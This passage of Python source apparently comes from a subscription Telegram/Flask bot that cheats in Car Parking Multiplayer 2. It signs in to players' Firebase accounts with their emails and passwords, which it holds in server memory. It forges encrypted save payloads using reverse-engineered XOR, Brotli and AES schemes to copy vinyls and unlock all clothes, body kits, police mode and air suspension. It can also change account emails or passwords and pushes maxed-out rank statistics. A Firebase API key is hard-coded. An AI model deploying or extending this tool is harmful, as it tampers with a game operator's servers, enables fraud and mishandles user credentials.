local_id, "" if id_token and local_id else error\n\nasync def open_cloud_vinyl_session(email, password):\n    result = {"cars": None, "error": "", "email": email, "password": password}\n    try:\n        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=25)) as session:\n            id_token, local_id, err = await _authenticate_cpm2(email, password, session)\n            if err:\n                result["error"] = err; return result\n            value = await _read_raw_cars(id_token, local_id)\n        if value is None:\n            result["error"] = "CARS_UNAVAILABLE"; return result\n        cars = _parse_memorypack_cloud_vinyls(value, local_id)\n        if cars is None:\n            result["error"] = "VINYL_SCHEMA_UNSUPPORTED"; return result\n        result["cars"] = [{**c, "name": get_car_name(c["id"])} for c in cars]\n    except Exception as e:\n        logging.warning(f"CPM2 session error: {e}")\n        result["error"] = "CONNECTION_ERROR"\n    return result\n\ndef _encode_save_car_fields(target, donor, local_id, mode="vinyl"):\n    values = {0: bytes(target["car_id_raw"]), 1: bytes(target["instance_raw"]),\n              7: bytes(donor["vinyls_raw"]), 8: bytes(donor["window_raw"])}\n    if mode == "style":\n        style = donor.get("style_fields")\n        if not isinstance(style, dict) or any(k not in style for k in range(2, 7)):\n            raise ValueError("STYLE_SCHEMA_UNSUPPORTED")\n        values.update({k: bytes(style[k]) for k in range(2, 7)})\n    elif mode != "vinyl":\n        raise ValueError("TRANSFER_MODE_INVALID")\n    fields = tuple(sorted(values.items()))\n    serialized = bytearray(struct.pack("<i", len(fields)))\n    for key, field in fields:\n        serialized.extend(struct.pack("<Hi", key, len(field)))\n        serialized.extend(field)\n    xor_key = _memorypack_xor_key(local_id)\n    if brotli is None or not xor_key: raise ValueError("MEMORYPACK_UNAVAILABLE")\n    packed = brotli.compress(bytes(serialized))\n    encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(packed))\n    return base64.b64encode(encrypted).decode("ascii")\n\nasync def execute_api_vinyl_transfer(cpm1_email, cpm1_password, cpm2_email, cpm2_password,\n                                      cpm1_car_index, cpm2_car_index):\n    result = {"sent": 0, "verified": 0, "total": 1, "error": ""}\n    donor_snap = await open_cpm1_cloud_session(cpm1_email, cpm1_password)\n    if donor_snap.get("error"):\n        result["error"] = f"CPM1 Error: {donor_snap[\'error\']}"; return result\n    target_snap = await open_cloud_vinyl_session(cpm2_email, cpm2_password)\n    if target_snap.get("error"):\n        result["error"] = f"CPM2 Error: {target_snap[\'error\']}"; return result\n    donor_cars = {int(c["index"]): c for c in (donor_snap.get("cars") or [])}\n    target_cars = {int(c["index"]): c for c in (target_snap.get("cars") or [])}\n    donor_car = donor_cars.get(int(cpm1_car_index))\n    target_car = target_cars.get(int(cpm2_car_index))\n    if not donor_car:\n        result["error"] = "Source car not found."; return result\n    if not target_car:\n        result["error"] = "Target car not found."; return result\n    # Vinyl-only: need vinyls_raw; window can be empty list bytes\n    if not isinstance(donor_car.get("vinyls_raw"), (bytes, bytearray)):\n        result["error"] = "Source vinyls unavailable (car has no vinyl data)."; return result\n    if not isinstance(donor_car.get("window_raw"), (bytes, bytearray)):\n        # empty vinyl list as MemoryPack int32 length 0\n        donor_car = dict(donor_car)\n        donor_car["window_raw"] = struct.pack("<i", 0)\n    if not target_car.get("transferable") and not (\n        isinstance(target_car.get("car_id_raw"), (bytes, bytearray))\n        and isinstance(target_car.get("instance_raw"), (bytes, bytearray))\n    ):\n        result["error"] = "Target car is not transferable (missing instance data)."; return result\n    try:\n        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=45)) as session:\n            id_token, local_id, err = await _authenticate_cpm2(cpm2_email, cpm2_password, session)\n            if err:\n                result["error"] = f"CPM2 Auth Failed: {err}"; return result\n            try:\n                payload = _encode_save_car_fields(target_car, donor_car, local_id, mode="vinyl")\n            except Exception as e:\n                result["error"] = f"Encode failed: {e}"; return result\n\n            # Try current + fallback save endpoints\n            save_fns = []\n            try:\n                save_fns.append(CPM2_SAVE_CAR_FUNCTION)\n            except Exception:\n                pass\n            try:\n                save_fns.extend(list(CPM2_SAVE_CAR_CANDIDATES))\n            except Exception:\n                save_fns.extend(["SaveCar23_1", "SaveCar22_1", "SaveCar24_1"])\n            # unique preserve order\n            seen = set()\n            ordered = []\n            for fn in save_fns:\n                if fn and fn not in seen:\n                    seen.add(fn); ordered.append(fn)\n\n            last_err = "Save rejected by server."\n            ok = False\n            used_fn = None\n            for fn in ordered:\n                ok, save_resp = await _call_function_payload(fn, id_token, payload, session)\n                if ok:\n                    used_fn = fn\n                    break\n                # richer error\n                if isinstance(save_resp, dict):\n                    last_err = "Save rejected (%s): %s" % (fn, save_resp.get("error") or save_resp.get("code") or save_resp)\n                elif save_resp is not None:\n                    last_err = "Save rejected (%s): %s" % (fn, str(save_resp)[:120])\n                else:\n                    last_err = "Save rejected (%s)" % fn\n            if not ok:\n                result["error"] = str(last_err)[:200]; return result\n\n            result["sent"] = 1\n            result["save_fn"] = used_fn\n            expected_iid = str(target_car.get("instance_id") or "")\n            donor_v = bytes(donor_car.get("vinyls_raw") or b"")\n            for attempt in range(6):\n                if attempt:\n                    await asyncio.sleep(float(attempt) * 0.8)\n                verified_val = await _read_raw_cars(id_token, local_id)\n                verified_cars = _parse_memorypack_cloud_vinyls(verified_val, local_id)\n                if verified_cars is None:\n                    continue\n                for c in verified_cars:\n                    same_iid = expected_iid and str(c.get("instance_id")) == expected_iid\n                    same_idx = int(c.get("index", -1)) == int(cpm2_car_index)\n                    vraw = c.get("vinyls_raw")\n                    if (same_iid or same_idx) and isinstance(vraw, (bytes, bytearray)) and bytes(vraw) == donor_v:\n                        result["verified"] = 1\n                        break\n                if result["verified"] == 1:\n                    break\n            if result["verified"] != 1:\n                # still treat as soft success if server accepted save\n                result["error"] = "Transfer sent (save OK via %s) but verification pending — check in-game." % (used_fn or "SaveCar")\n            return result\n    except Exception as e:\n        result["error"] = f"Exception: {e}"; return result\n\n\n\nasync def execute_cpm2_to_cpm2_vinyl(src_email, src_pass, tgt_email, tgt_pass, src_idx, tgt_idx):\n    """Copy vinyls from one CPM2 car to another CPM2 car."""\n    result = {"sent": 0, "verified": 0, "total": 1, "error": ""}\n    donor_snap = await open_cloud_vinyl_session(src_email, src_pass)\n    if donor_snap.get("error"):\n        result["error"] = "Source CPM2: %s" % donor_snap["error"]\n        return result\n    target_snap = await open_cloud_vinyl_session(tgt_email, tgt_pass)\n    if target_snap.get("error"):\n        result["error"] = "Target CPM2: %s" % target_snap["error"]\n        return result\n    donor_cars = {int(c["index"]): c for c in (donor_snap.get("cars") or [])}\n    target_cars = {int(c["index"]): c for c in (target_snap.get("cars") or [])}\n    donor_car = donor_cars.get(int(src_idx))\n    target_car = target_cars.get(int(tgt_idx))\n    if not donor_car:\n        result["error"] = "Source car not found."\n        return result\n    if not target_car:\n        result["error"] = "Target car not found."\n        return result\n    if not isinstance(donor_car.get("vinyls_raw"), (bytes, bytearray)):\n        result["error"] = "Source vinyls unavailable."\n        return result\n    if not isinstance(donor_car.get("window_raw"), (bytes, bytearray)):\n        donor_car = dict(donor_car)\n        donor_car["window_raw"] = struct.pack("<i", 0)\n    if not (\n        isinstance(target_car.get("car_id_raw"), (bytes, bytearray))\n        and isinstance(target_car.get("instance_raw"), (bytes, bytearray))\n    ):\n        result["error"] = "Target car not transferable."\n        return result\n    try:\n        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=45)) as session:\n            id_token, local_id, err = await _authenticate_cpm2(tgt_email, tgt_pass, session)\n            if err:\n                result["error"] = "Target auth: %s" % err\n                return result\n            try:\n                payload = _encode_save_car_fields(target_car, donor_car, local_id, mode="vinyl")\n            except Exception as e:\n                result["error"] = "Encode failed: %s" % e\n                return result\n            save_fns = [CPM2_SAVE_CAR_FUNCTION] + list(CPM2_SAVE_CAR_CANDIDATES)\n            seen, ordered = set(), []\n            for fn in save_fns:\n                if fn and fn not in seen:\n                    seen.add(fn)\n                    ordered.append(fn)\n            ok, last_err, used_fn = False, "Save rejected", None\n            for fn in ordered:\n                ok, save_resp = await _call_function_payload(fn, id_token, payload, session)\n                if ok:\n                    used_fn = fn\n                    break\n                if isinstance(save_resp, dict):\n                    last_err = "Save rejected (%s): %s" % (fn, save_resp.get("error") or save_resp.get("code") or save_resp)\n                else:\n                    last_err = "Save rejected (%s)" % fn\n            if not ok:\n                result["error"] = str(last_err)[:200]\n                return result\n            result["sent"] = 1\n            result["save_fn"] = used_fn\n            expected_iid = str(target_car.get("instance_id") or "")\n            donor_v = bytes(donor_car.get("vinyls_raw") or b"")\n            for attempt in range(6):\n                if attempt:\n                    await asyncio.sleep(float(attempt) * 0.8)\n                verified_val = await _read_raw_cars(id_token, local_id)\n                verified_cars = _parse_memorypack_cloud_vinyls(verified_val, local_id)\n                if not verified_cars:\n                    continue\n                for c in verified_cars:\n                    same_iid = expected_iid and str(c.get("instance_id")) == expected_iid\n                    same_idx = int(c.get("index", -1)) == int(tgt_idx)\n                    vraw = c.get("vinyls_raw")\n                    if (same_iid or same_idx) and isinstance(vraw, (bytes, bytearray)) and bytes(vraw) == donor_v:\n                        result["verified"] = 1\n                        break\n                if result["verified"] == 1:\n                    break\n            if result["verified"] != 1:\n                result["error"] = "Transfer sent (save OK via %s) — check in-game." % (used_fn or "SaveCar")\n            return result\n    except Exception as e:\n        result["error"] = "Exception: %s" % e\n        return result\n\n\n\n\n\n# ============================================================\n# FLASK WEB\n# ============================================================\nPORT = int(os.environ.get("PORT", "8080"))\nSECRET = os.environ.get("SECRET_KEY") or secrets.token_hex(16)\nSTATIC = os.path.dirname(os.path.abspath(__file__))\n\napp = Flask(__name__, static_folder=STATIC)\napp.secret_key = SECRET\n\nBOT_WEBAPP_AUTH_URL = (os.environ.get("BOT_WEBAPP_AUTH_URL") or "").strip().rstrip("/") + "/api/webapp/access" if os.environ.get("BOT_WEBAPP_AUTH_URL") else ""\n\n\ndef _web_access_required():\n    if not session.get("telegram_allowed"):\n        return jsonify({"ok": False, "error": "subscription_required", "message": "Active subscription required."}), 403\n    return None\n\n\ndef _check_bot_webapp(init_data):\n    if not BOT_WEBAPP_AUTH_URL:\n        return {"ok": False, "error": "bot_auth_not_configured"}\n    payload = json.dumps({"initData": init_data}).encode("utf-8")\n    req = urllib.request.Request(BOT_WEBAPP_AUTH_URL, data=payload, headers={"Content-Type": "application/json"}, method="POST")\n    try:\n        with urllib.request.urlopen(req, timeout=12) as resp:\n            return json.loads(resp.read().decode("utf-8"))\n    except Exception as exc:\n        return {"ok": False, "error": "bot_auth_unreachable", "message": str(exc)[:180]}\n\n# short-lived server sessions for multi-step transfer\n_web_sessions = {}\n_web_lock = __import__("threading").Lock()\n\n\ndef _sid():\n    if "sid" not in session:\n        session["sid"] = secrets.token_hex(16)\n    return session["sid"]\n\n\ndef _ws():\n    sid = _sid()\n    with _web_lock:\n        if sid not in _web_sessions:\n            _web_sessions[sid] = {}\n        return _web_sessions[sid]\n\n\n@app.route("/api/webapp/auth", methods=["POST"])\ndef webapp_auth():\n    body = request.get_json(silent=True) or {}\n    init_data = str(body.get("initData") or "")\n    if not init_data:\n        return jsonify({"ok": False, "error": "missing_init_data"}), 401\n    result = _check_bot_webapp(init_data)\n    if not result.get("ok"):\n        return jsonify(result), 401\n    session["telegram_allowed"] = bool(result.get("allowed", result.get("active", False)))\n    session["telegram_id"] = result.get("telegram_id", result.get("user_id"))\n    session["telegram_user"] = {\n        "first_name": result.get("first_name", ""),\n        "last_name": result.get("last_name", ""),\n        "username": result.get("username", ""),\n        "photo_url": result.get("photo_url", ""),\n    }\n    session["telegram_admin"] = bool(result.get("is_admin"))\n    return jsonify(result)\n\n\n@app.route("/")\ndef index():\n    return send_from_directory(STATIC, "index.html")\n\n\n@app.route("/assets/<path:filename>")\ndef serve_site_assets(filename):\n    return send_from_directory(os.path.join(STATIC, "assets"), filename)\n\n\n@app.route("/api/connect_source", methods=["POST"])\ndef api_connect_source():\n    gate = _web_access_required()\n    if gate: return gate\n    body = request.get_json(silent=True) or {}\n    mode = (body.get("mode") or "c1c2").strip()\n    email = (body.get("email") or "").strip()\n    password = body.get("password") or ""\n    if not email or not password:\n        return jsonify({"ok": False, "error": "email and password required"})\n    if mode not in ("c1c2", "c2c2"):\n        return jsonify({"ok": False, "error": "mode must be c1c2 or c2c2"})\n\n    async def run():\n        if mode == "c1c2":\n            return await open_cpm1_cloud_session(email, password)\n        return await open_cloud_vinyl_session(email, password)\n\n    try:\n        snap = asyncio.run(run())\n    except Exception as e:\n        return jsonify({"ok": False, "error": str(e)[:200]})\n    if snap.get("error"):\n        return jsonify({"ok": False, "error": snap["error"]})\n    cars = snap.get("cars") or []\n    if not cars:\n        return jsonify({"ok": False, "error": "No cars on source"})\n    ws = _ws()\n    ws.clear()\n    ws.update({\n        "mode": mode,\n        "src_email": email,\n        "src_pass": password,\n        "src_cars": cars,\n    })\n    # serializable car list for UI\n    ui_cars = []\n    for c in cars:\n        ui_cars.append({\n            "index": c.get("index"),\n            "id": c.get("id"),\n            "name": c.get("name") or get_car_name(c.get("id")),\n            "vinyls": c.get("vinyls", 0),\n            "has_vinyl": isinstance(c.get("vinyls_raw"), (bytes, bytearray)) or (c.get("vinyls") or 0) > 0,\n        })\n    return jsonify({"ok": True, "cars": ui_cars, "count": len(ui_cars)})\n\n\n@app.route("/api/connect_target", methods=["POST"])\ndef api_connect_target():\n    gate = _web_access_required()\n    if gate: return gate\n    body = request.get_json(silent=True) or {}\n    email = (body.get("email") or "").strip()\n    password = body.get("password") or ""\n    ws = _ws()\n    if not ws.get("src_email"):\n        return jsonify({"ok": False, "error": "Connect source first"})\n    if not email or not password:\n        return jsonify({"ok": False, "error": "email and password required"})\n\n    async def run():\n        return await open_cloud_vinyl_session(email, password)\n\n    try:\n        snap = asyncio.run(run())\n    except Exception as e:\n        return jsonify({"ok": False, "error": str(e)[:200]})\n    if snap.get("error"):\n        return jsonify({"ok": False, "error": snap["error"]})\n    cars = snap.get("cars") or []\n    if not cars:\n        return jsonify({"ok": False, "error": "No cars on target"})\n    ws["tgt_email"] = email\n    ws["tgt_pass"] = password\n    ws["tgt_cars"] = cars\n    ui_cars = []\n    for c in cars:\n        ui_cars.append({\n            "index": c.get("index"),\n            "id": c.get("id"),\n            "name": c.get("name") or get_car_name(c.get("id")),\n            "vinyls": c.get("vinyls", 0),\n            "has_vinyl": isinstance(c.get("vinyls_raw"), (bytes, bytearray)) or (c.get("vinyls") or 0) > 0,\n        })\n    return jsonify({"ok": True, "cars": ui_cars, "count": len(ui_cars)})\n\n\n@app.route("/api/transfer", methods=["POST"])\ndef api_transfer():\n    gate = _web_access_required()\n    if gate: return gate\n    body = request.get_json(silent=True) or {}\n    ws = _ws()\n    try:\n        src_idx = int(body.get("src_index"))\n        tgt_idx = int(body.get("tgt_index"))\n    except Exception:\n        return jsonify({"ok": False, "error": "Need src_index and tgt_index"})\n    if not ws.get("src_email") or not ws.get("tgt_email"):\n        return jsonify({"ok": False, "error": "Connect source and target first"})\n\n    mode = ws.get("mode") or "c1c2"\n\n    async def run():\n        if mode == "c1c2":\n            return await execute_api_vinyl_transfer(\n                ws["src_email"], ws["src_pass"],\n                ws["tgt_email"], ws["tgt_pass"],\n                src_idx, tgt_idx,\n            )\n        return await execute_cpm2_to_cpm2_vinyl(\n            ws["src_email"], ws["src_pass"],\n            ws["tgt_email"], ws["tgt_pass"],\n            src_idx, tgt_idx,\n        )\n\n    try:\n        res = asyncio.run(run())\n    except Exception as e:\n        return jsonify({"ok": False, "error": str(e)[:200]})\n\n    ok = bool(res.get("sent"))\n    return jsonify({\n        "ok": ok,\n        "sent": res.get("sent"),\n        "verified": res.get("verified"),\n        "message": res.get("error") or ("Transfer complete" if ok else "Failed"),\n        "save_fn": res.get("save_fn"),\n    })\n\n\n@app.route("/api/reset", methods=["POST"])\ndef api_reset():\n    gate = _web_access_required()\n    if gate: return gate\n    ws = _ws()\n    ws.clear()\n    return jsonify({"ok": True})\n\n\n# Web server entrypoint intentionally omitted in Telegram bot.\n'
CPM2_ENGINE_NAMESPACE = {
    "__name__": "cpm2_embedded_engine",
    "__file__": "/tmp/cpm2_embedded_engine.py",
    "Flask": _CPM2DummyFlask,
    "request": _CPM2DummyRequest(),
    "jsonify": _cpm2_dummy_jsonify,
    "send_from_directory": _cpm2_dummy_send_from_directory,
    "session": {},
}
exec(compile(_CPM2_ENGINE_SOURCE, "<embedded cpm2 engine>", "exec"), CPM2_ENGINE_NAMESPACE)
# Reuse the Firebase keys configured by the main bot. Keep the CPM1 key
# fallback from the supplied SIDALI source so CPM1→CPM2 transfer works even
# when CPM1_FIREBASE_KEY is not separately configured in the deployment.
CPM2_ENGINE_NAMESPACE["CPM1_API_KEY"] = os.getenv("CPM1_FIREBASE_KEY", "").strip() or "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
CPM2_ENGINE_NAMESPACE["CPM2_API_KEY"] = CPM2_ACTIVATION_FIREBASE_KEY
cpm2_engine = SimpleNamespace(**CPM2_ENGINE_NAMESPACE)

CPM2_KEY_ADD = "12345678"
CPM2_IV_ADD = "01234567"
class CPM2ActivationCrypto:
    def __init__(self, uid):
        from Crypto.Cipher import AES as _AES
        from Crypto.Util.Padding import pad as _pad
        self._AES, self._pad = _AES, _pad
        self.uid = str(uid)
        self.key = (self.uid[:8] + CPM2_KEY_ADD).encode()[:16]
        self.iv = (self.uid[:8] + CPM2_IV_ADD).encode()[:16]
    def encrypt(self, value):
        return base64.b64encode(self._AES.new(self.key, self._AES.MODE_CBC, self.iv).encrypt(self._pad(value.encode(),16))).decode()

CPM2_CLOTHES_FIELDS = {'EquipmentsMale.bag': 19, 'EquipmentsMale.beard': 20, 'EquipmentsMale.cap': 21, 'EquipmentsMale.face': 22, 'EquipmentsMale.glasses': 23, 'EquipmentsMale.gloves': 24, 'EquipmentsMale.hair': 25, 'EquipmentsMale.mask': 26, 'EquipmentsMale.pants': 27, 'EquipmentsMale.shoes': 28, 'EquipmentsMale.top': 29, 'EquipmentsFemale.bag': 31, 'EquipmentsFemale.beard': 32, 'EquipmentsFemale.cap': 33, 'EquipmentsFemale.face': 34, 'EquipmentsFemale.glasses': 35, 'EquipmentsFemale.gloves': 36, 'EquipmentsFemale.hair': 37, 'EquipmentsFemale.mask': 38, 'EquipmentsFemale.pants': 39, 'EquipmentsFemale.shoes': 40, 'EquipmentsFemale.top': 41}

def cpm2_clothes_payload(firebase_uid):
    """Build the exact 22-field CPM2 wardrobe payload from the supplied source."""
    values = list(range(200))
    encoded_list = struct.pack("<i", len(values)) + struct.pack("<200i", *values)
    raw = struct.pack("<i", len(CPM2_CLOTHES_FIELDS))
    for field_index in CPM2_CLOTHES_FIELDS.values():
        raw += struct.pack("<Hi", field_index, len(encoded_list)) + encoded_list

    key = list(str(firebase_uid).encode())
    if not key:
        raise ValueError("Login returned an empty account ID.")
    if len(key) > 6:
        key[4], key[6] = key[6], key[4]
    if len(key) > 8:
        key.pop(8)
    key.append(str(firebase_uid).encode()[0])
    compressed = brotli.compress(raw)
    encrypted = bytes(value ^ key[i % len(key)] for i, value in enumerate(compressed))
    return base64.b64encode(encrypted).decode("ascii")

def cpm2_unlock_all_clothes(email, password):
    """Authenticate and submit only the male/female wardrobe fields to CPM2."""
    headers = {
        "Content-Type": "application/json",
        "X-Unity-Version": "2022.3.62f2",
    }
    try:
        auth_response = requests.post(
            CPM2_CLOTHES_LOGIN_URL,
            headers=headers,
            json={
                "email": email,
                "password": password,
                "returnSecureToken": True,
                "clientType": "CLIENT_TYPE_ANDROID",
            },
            timeout=45,
        )
        if auth_response.status_code != 200:
            return False, f"CPM2 login HTTP {auth_response.status_code}"
        auth = auth_response.json()
        token, firebase_uid = auth.get("idToken"), auth.get("localId")
        if not token or not firebase_uid:
            error = auth.get("error", {})
            message = error.get("message", "Login failed") if isinstance(error, dict) else "Login failed"
            return False, str(message)[:160]

        save_headers = {
            **headers,
            "Authorization": "Bearer " + token,
            "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
        }
        save_response = requests.post(
            CPM2_CLOTHES_SAVE_URL,
            headers=save_headers,
            json={"data": cpm2_clothes_payload(firebase_uid)},
            timeout=45,
            allow_redirects=False,
        )
        if save_response.status_code != 200:
            return False, f"CPM2 save HTTP {save_response.status_code}"
        try:
            result = save_response.json()
        except ValueError:
            return False, "CPM2 returned an unreadable save response"
        if not isinstance(result, dict) or "error" in result:
            return False, "CPM2 rejected the clothes update"
        inner = result.get("result")
        if isinstance(inner, dict) and "error" in inner:
            return False, "CPM2 rejected the clothes update"
        code = inner.get("code") if isinstance(inner, dict) else inner
        if code is None:
            code = result.get("code")
        if type(code) is int and code == 1:
            return True, "The CPM2 service accepted the clothes update"
        if code is not None:
            return False, "CPM2 did not accept the clothes update"
        return False, "Update submitted, but CPM2 did not confirm success"
    except requests.RequestException:
        return False, "Connection failed or timed out"
    except Exception as exc:
        return False, str(exc)[:180]

CPM2_BODYKIT_IDS = list(range(1, 351))

def _cpm2_build_bought_body_kits(ids):
    out = bytearray([0x0A])
    for _ in range(10):
        out.extend(struct.pack("<i", len(ids)))
        for value in ids:
            out.extend(struct.pack("<i", int(value)))
    return bytes(out)

def _cpm2_apply_unlock_fields(tc, mode="police"):
    style = tc.get("style_fields")
    if not isinstance(style, dict):
        raise ValueError("STYLE_UNAVAIL")
    if mode == "bodykit":
        if 2 not in style:
            raise ValueError("BODYKIT_FIELD_MISSING")
        return {2: _cpm2_build_bought_body_kits(CPM2_BODYKIT_IDS)}
    if 5 not in style:
        raise ValueError("STYLE_UNAVAIL")
    f5 = bytearray(style[5])
    po = None
    for i in range(len(f5) - 3):
        if f5[i] == 0x04 and f5[i+3] == 0x05 and f5[i+1] in (0, 1) and f5[i+2] in (0, 1):
            po = i
            break
    if po is None:
        raise ValueError("POLICE_MARKER_MISSING")
    if mode == "police":
        f5[po+1] = 1
        f5[po+2] = 1
    elif mode == "air":
        ao = po + 29
        if ao >= len(f5):
            raise ValueError("AIRSUS_OUT_OF_RANGE")
        if f5[ao] == 0x02:
            f5[ao+1] = 1
            f5[ao+2] = 1
        elif f5[ao] in (0x00, 0xFF):
            f5 = bytearray(f5[:ao]) + bytearray([0x02, 1, 1]) + bytearray(f5[ao+1:])
        else:
            raise ValueError(f"AIRSUS_BYTE_{f5[ao]:02x}")
    else:
        raise ValueError("INVALID_MODE")
    return {5: bytes(f5)}

def _cpm2_encode_unlock_payload(tc, local_id, mode):
    style = tc.get("style_fields")
    if not isinstance(style, dict) or any(k not in style for k in range(2, 7)):
        raise ValueError("STYLE_SCHEMA_UNSUPPORTED")
    values = {0: bytes(tc["car_id_raw"]), 1: bytes(tc["instance_raw"]),
              2: bytes(style[2]), 3: bytes(style[3]), 4: bytes(style[4]),
              5: bytes(style[5]), 6: bytes(style[6])}
    values.update(_cpm2_apply_unlock_fields(tc, mode))
    fields = tuple(sorted(values.items()))
    ser = bytearray(struct.pack("<i", len(fields)))
    for key, field in fields:
        ser.extend(struct.pack("<Hi", key, len(field)))
        ser.extend(field)
    xor_key = cpm2_engine._memorypack_xor_key(local_id)
    if not xor_key or not getattr(cpm2_engine, "brotli", None):
        raise ValueError("CPM2 encoder unavailable")
    packed = cpm2_engine.brotli.compress(bytes(ser))
    enc = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(packed))
    return base64.b64encode(enc).decode("ascii")

async def cpm2_execute_activation(email, password, car_index, mode):
    result = {"sent": 0, "verified": 0, "error": ""}
    snap = await cpm2_engine.open_cloud_vinyl_session(email, password)
    if snap.get("error"):
        result["error"] = str(snap["error"])
        return result
    target = next((c for c in (snap.get("cars") or []) if c.get("index") == car_index), None)
    if not target:
        result["error"] = "السيارة غير موجودة"
        return result
    if not target.get("transferable") or not isinstance(target.get("style_fields"), dict):
        result["error"] = "بيانات السيارة غير مكتملة أو غير قابلة للتعديل"
        return result
    try:
        async with cpm2_engine.aiohttp.ClientSession(timeout=cpm2_engine.aiohttp.ClientTimeout(total=45)) as session:
            token, local_id, err = await cpm2_engine._authenticate_cpm2(email, password, session)
            if err:
                result["error"] = f"Auth: {err}"
                return result
            payload = _cpm2_encode_unlock_payload(target, local_id, mode)
            # Try the supported CPM2 save-function versions, as the original
            # CPM2 transfer implementation does. A function-level rejection
            # (for example code 80) is not proof that every version rejects it.
            save_candidates = tuple(getattr(cpm2_engine, "CPM2_SAVE_CAR_CANDIDATES", ()))
            preferred = getattr(cpm2_engine, "CPM2_SAVE_CAR_FUNCTION", None)
            save_functions = list(dict.fromkeys(([preferred] if preferred else []) + list(save_candidates)))
            ok, response, save_fn = False, None, None
            failures = []
            for candidate in save_functions:
                candidate_ok, candidate_response = await cpm2_engine._call_function_payload(
                    candidate, token, payload, session
                )
                if candidate_ok:
                    ok, response, save_fn = True, candidate_response, candidate
                    break
                failures.append(f"{candidate}: {str(candidate_response)[:100]}")
            if not ok:
                result["error"] = "Save rejected: " + " | ".join(failures)[-300:]
                return result
            result["save_fn"] = save_fn
            result["sent"] = 1
            # Read-back verification uses the same CPM2 garage parser as vinyl transfer.
            for delay in (0, 1, 2, 3, 4):
                if delay:
                    await asyncio.sleep(delay)
                raw = await cpm2_engine._read_raw_cars(token, local_id)
                parsed = cpm2_engine._parse_memorypack_cloud_vinyls(raw, local_id)
                for car in parsed or []:
                    if str(car.get("instance_id")) != str(target.get("instance_id")):
                        continue
                    style = car.get("style_fields") or {}
                    if mode == "bodykit":
                        expected = _cpm2_build_bought_body_kits(CPM2_BODYKIT_IDS)
                        if style.get(2) == expected:
                            result["verified"] = 1
                    else:
                        f5 = style.get(5)
                        if not f5:
                            continue
                        marker = next((i for i in range(len(f5)-3) if f5[i] == 4 and f5[i+3] == 5), None)
                        if marker is None:
                            continue
                        if mode == "police" and f5[marker+1:marker+3] == bytes([1, 1]):
                            result["verified"] = 1
                        elif mode == "air":
                            pos = marker + 29
                            if pos + 2 < len(f5) and f5[pos:pos+3] == bytes([2, 1, 1]):
                                result["verified"] = 1
                if result["verified"]:
                    break
            if not result["verified"]:
                result["error"] = "تم الإرسال ولم يكتمل التحقق بعد"
            return result
    except Exception as exc:
        result["error"] = str(exc)[:220]
        return result

async def cpm2_activation_login_async(email: str, password: str):
    if not CPM2_ACTIVATION_FIREBASE_KEY:
        return {"error": "Missing CP2_FIREBASE_KEY variable."}
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={CPM2_ACTIVATION_FIREBASE_KEY}"
    headers = {"Content-Type": "application/json", "User-Agent": CPM2_ACTIVATION_USER_AGENT}
    try:
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(url, json={"email": email, "password": password,
                    "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}, headers=headers) as resp:
                data = await resp.json(content_type=None)
        if data.get("idToken"):
            return {"token": data["idToken"], "uid": data["localId"]}
        err = data.get("error", {})
        return {"error": err.get("message", "Login failed") if isinstance(err, dict) else str(err)}
    except Exception as exc:
        return {"error": str(exc)[:180]}

async def cpm2_update_account_async(email: str, password: str, field: str, value: str):
    """Re-authenticate CPM2 account, then update its Firebase email or password."""
    if field not in ("email", "password"):
        return {"ok": False, "error": "Unsupported account field"}
    if not CPM2_ACTIVATION_FIREBASE_KEY:
        return {"ok": False, "error": "Missing CP2_FIREBASE_KEY variable."}
    base = "https://identitytoolkit.googleapis.com/v1"
    headers = {"Content-Type": "application/json", "User-Agent": CPM2_ACTIVATION_USER_AGENT}
    timeout = aiohttp.ClientTimeout(total=25)
    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(
                f"{base}/accounts:signInWithPassword?key={CPM2_ACTIVATION_FIREBASE_KEY}",
                json={"email": email, "password": password, "returnSecureToken": True,
                      "clientType": "CLIENT_TYPE_ANDROID"}, headers=headers
            ) as resp:
                auth = await resp.json(content_type=None)
            token = auth.get("idToken")
            if not token:
                err = auth.get("error", {})
                return {"ok": False, "error": err.get("message", "CPM2 login failed") if isinstance(err, dict) else str(err)}
            payload = {"idToken": token, "returnSecureToken": True, field: value}
            async with session.post(f"{base}/accounts:update?key={CPM2_ACTIVATION_FIREBASE_KEY}",
                                    json=payload, headers=headers) as resp:
                result = await resp.json(content_type=None)
            if field == "email" and result.get("email"):
                return {"ok": True, "email": result["email"],
                        "token": result.get("idToken"), "refresh_token": result.get("refreshToken")}
            if field == "password" and result.get("localId"):
                return {"ok": True, "token": result.get("idToken"),
                        "refresh_token": result.get("refreshToken")}
            err = result.get("error", {})
            return {"ok": False, "error": err.get("message", "Update failed") if isinstance(err, dict) else str(err)}
    except Exception as exc:
        return {"ok": False, "error": str(exc)[:180]}


async def cpm2_king_rank_async(email: str, password: str):
    if not CPM2_ACTIVATION_OG_KEY:
        return False, "Missing CP2_OG_KEY variable."
    auth = await cpm2_activation_login_async(email, password)
    if not auth or "error" in auth:
        return False, f"CPM2 login failed: {(auth or {}).get('error', 'unknown')}"
    rating = {
        "cars":100000,"car_fix":100000,"car_collided":100000,"car_exchange":100000,
        "car_trade":100000,"car_wash":100000,"slicer_cut":100000,"drift_max":100000,
        "drift":100000,"cargo":100000,"delivery":100000,"taxi":100000,"levels":100000,
        "gifts":100000,"fuel":100000,"offroad":100000,"speed_banner":100000,"reactions":100000,
        "police":100000,"run":100000,"real_estate":100000,"t_distance":100000,"treasure":100000,
        "block_post":100000,"push_ups":100000,"burnt_tire":100000,"passanger_distance":100000,
        "time":9999999999,"race_win":5000
    }
    try:
        crypto = CPM2ActivationCrypto(auth["uid"])
        encrypted = crypto.encrypt(json.dumps(rating))
        headers = {"X-Firebase-Token": auth["token"], "X-Api-Key": CPM2_ACTIVATION_OG_KEY,
